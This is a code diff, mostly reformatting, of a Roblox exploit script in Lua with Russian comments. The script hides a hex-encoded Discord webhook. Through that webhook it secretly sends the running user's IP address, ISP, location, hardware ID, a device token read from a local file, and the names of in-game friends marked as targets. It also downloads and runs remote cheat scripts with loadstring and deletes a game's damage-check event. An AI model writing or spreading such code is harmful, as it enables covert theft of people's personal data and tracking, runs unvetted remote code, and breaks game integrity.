@@ -9,14 +9,14 @@ local _RAS = game:GetService("RbxAnalyticsService")
 -- КОНФИГУРАЦИЯ
 local Config = {
     WL = {
-        UIDs = {"1644351300"}, -- nazarkus
+        UIDs = {"1644351300"},
         HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
         Keys = {"29606246-6429-47FC-9A0F-362B8CA6B2AC"}
     },
-    BL = { 
-        UIDs = {"8085944684"}, -- BE_bom
-        HWIDs = {"36a40f68-74c0-4bf1-a715-8c47d2f23d6a"}, 
-        Keys = {"1f0e6ee3-bc21-4eee-b649-66150b226fdb"} 
+    BL = {
+        UIDs = {"8085944684"},
+        HWIDs = {"36a40f68-74c0-4bf1-a715-8c47d2f23d6a"},
+        Keys = {"1f0e6ee3-bc21-4eee-b649-66150b226fdb"}
     }
 }
 
@@ -24,7 +24,11 @@ local Config = {
 local _uid = tostring(_lp.UserId)
 local _hw = _RAS:GetClientId()
 local _tk = "N/A"
-pcall(function() if isfile and isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json") end end)
+pcall(function()
+    if isfile and isfile("nazarkus_key.json") then
+        _tk = readfile("nazarkus_key.json")
+    end
+end)
 
 local function chk(l)
     for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
@@ -40,7 +44,9 @@ local _st = _isWL and "whitelist" or (_isBL and "blacklist" or "guest")
 -- ДЕКОДЕР ВЕБХУКА
 local function _D(h)
     local s = ""
-    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
+    for i = 1, #h, 2 do
+        s = s .. string.char(tonumber(h:sub(i, i + 1), 16))
+    end
     return s
 end
 local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
@@ -52,21 +58,33 @@ local function _LOG()
         if not req then return end
 
         local ni = {}
-        local r = req({Url = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting", Method = "GET"})
-        if r and r.Success then ni = _H:JSONDecode(r.Body) end
+        local r = req({
+            Url = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting",
+            Method = "GET"
+        })
+        if r and r.Success then
+            ni = _H:JSONDecode(r.Body)
+        end
 
         local u = 0
         local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
-        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
-        local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/4)*100) .. "%)"
-        
+        for _, f in ipairs(tu) do
+            if getgenv()[f] then
+                u = u + 1
+            end
+        end
+        local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u / 4) * 100) .. "%)"
+
         local fn, ft = "None", "None"
         local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
         if fdf then
             for _, f in ipairs(fdf:GetChildren()) do
                 if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
                     local bd = f:FindFirstChild("BasicFactionData")
-                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
+                    if bd then
+                        fn = bd.FactionName.Value  -- ← ТУТ БЫЛА ОШИБКА
+                        ft = bd.FactionTag.Value
+                    end
                     break
                 end
             end
@@ -75,14 +93,21 @@ local function _LOG()
         local jid = game.JobId == "" and "Unknown" or game.JobId
         local joinBase = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
         local joinUrl = "N/A"
-        pcall(function() 
-            local res = req({Url = "https://tinyurl.com/api-create.php?url=" .. _H:UrlEncode(joinBase), Method = "GET"}) 
-            if res.Success then joinUrl = res.Body end 
+        pcall(function()
+            local res = req({
+                Url = "https://tinyurl.com/api-create.php?url=" .. _H:UrlEncode(joinBase),
+                Method = "GET"
+            })
+            if res.Success then
+                joinUrl = res.Body
+            end
         end)
-        
+
         local friends = {}
-        for _, p in ipairs(game.Players:GetPlayers()) do 
-            if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end 
+        for _, p in ipairs(game.Players:GetPlayers()) do
+            if p ~= _lp and _lp:IsFriendsWith(p.UserId) then
+                table.insert(friends, p.Name)
+            end
         end
 
         local payload = {
@@ -97,21 +122,29 @@ local function _LOG()
                     {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                     {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
                     {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
-                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", _MS:GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
+                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", _MS:GetProductInfo(game.PlaceId).Name, tostring(game.PlaceId), jid), ["inline"] = false},
                     {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
                     {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), ["inline"] = false}
                 },
                 ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
             }}
         }
-        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
+        req({
+            Url = _W,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = _H:JSONEncode(payload)
+        })
     end)
 end
 
 task.spawn(_LOG)
 
 -- КИК ЧЕРНОГО СПИСКА
-if _isBL then _lp:Kick("Banned.") return end
+if _isBL then
+    _lp:Kick("Banned.")
+    return
+end
 
 -- ПРОВЕРКА ЛОАДЕРА
 local _stg = _ts:FindFirstChild("__NK_RUNTIME")
@@ -128,13 +161,28 @@ end
 shared._NK_AUTH = nil
 
 -- ЗАГРУЗКА СКРИПТОВ
-local function safeLoad(url) pcall(function() loadstring(game:HttpGet(url))() end) end
+local function safeLoad(url)
+    pcall(function()
+        loadstring(game:HttpGet(url))()
+    end)
+end
+
 safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
 safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")
 safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
 safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")
 
 -- ФИКС ACS
-pcall(function() if _RS:FindFirstChild("ACS_Engine") then _RS.ACS_Engine.Events.FDMG:Destroy() end end)
+pcall(function()
+    if _RS:FindFirstChild("ACS_Engine") then
+        _RS.ACS_Engine.Events.FDMG:Destroy()
+    end
+end)
 
-if _auth then _auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end) end
+if _auth then
+    _auth.Changed:Connect(function(v)
+        if v == "kick" then
+            _lp:Kick("Access Revoked.")
+        end
+    end)
+end
